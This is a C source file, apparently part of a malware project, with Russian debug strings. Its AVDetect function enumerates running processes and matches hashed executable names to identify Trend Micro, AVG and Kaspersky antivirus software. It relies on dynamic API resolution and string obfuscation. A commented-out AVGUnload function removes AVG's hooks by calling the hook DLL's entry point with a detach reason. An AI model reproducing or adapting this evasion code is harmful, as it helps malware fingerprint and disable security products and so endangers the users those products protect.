#include "AV.h"
#include <tlhelp32.h>

int AVDetect()
{
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snap = API(KERNEL32, CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 );
	if( snap == INVALID_HANDLE_VALUE ) return 0;
	int ret = 0;
	if( API(KERNEL32, Process32First)( snap, &pe ) ) 
	{
		do
		{
			char name[64];
			int i = 0;
			uint hash = Str::Hash( Str::Lower(pe.szExeFile) );
			switch( hash )
			{
				case 0x0fc4e7c5: //sfctlcom.exe
				case 0x0946e915: //protoolbarupdate.exe
				case 0x06810b75: //tmproxy.exe
				case 0x06da37a5: //tmpfw.exe
				case 0x0ae475a5: //tmbmsrv.exe
				case 0x0becd795: //ufseagnt.exe
				case 0x0b97d795: //uiseagnt.exe
				case 0x08cdf1a5: //ufnavi.exe
				case 0x0b82e2c5: //uiwatchdog.exe
					return AV_TrandMicro;
				case 0x0d802425: //avgam.exe
				case 0x0f579645: //avgcsrvx.exe
				case 0x0e048135: //avgfws9.exe
				case 0x0c34c035: //avgemc.exe
				case 0x09adc005: //avgrsx.exe
				case 0x0c579515: //avgchsvx.exe
				case 0x08e48255: //avgtray.exe
				case 0x0ebc2425: //avgui.exe
					return AV_AVG;
				case 0x08d34c85: //avp.exe
				case 0x07bc2435: //avpui.exe
					return AV_KAV;

			}
		} while( API(KERNEL32, Process32Next)( snap, &pe ) );
	}
	API(KERNEL32, CloseHandle)(snap);
	return ret;
}

/*
bool AVGUnload()
{
	typedef BOOL(WINAPI *typeDllMain)( _In_ HINSTANCE hinstDLL,_In_ DWORD fdwReason, _In_ LPVOID lpvReserved );
	typeDllMain DllMain;
	HINSTANCE dllAvg = API(KERNEL32, GetModuleHandleA)( _CS_("avghookx.dll") );
	if( dllAvg )
	{
		DbgMsg( "Обнаружен AVG (avghookx.dll)" );
		PIMAGE_NT_HEADERS ntHeaders = PE::GetNTHeaders(dllAvg);
		DWORD addrEP = (DWORD)dllAvg + ntHeaders->OptionalHeader.AddressOfEntryPoint;
		DllMain = (typeDllMain)addrEP;
		DllMain( dllAvg, DLL_PROCESS_DETACH, NULL ); //снятие хуков AVG
		return true;
	}
	else
		DbgMsg( "AVG не обнаружен" );
	return false;
}
*/
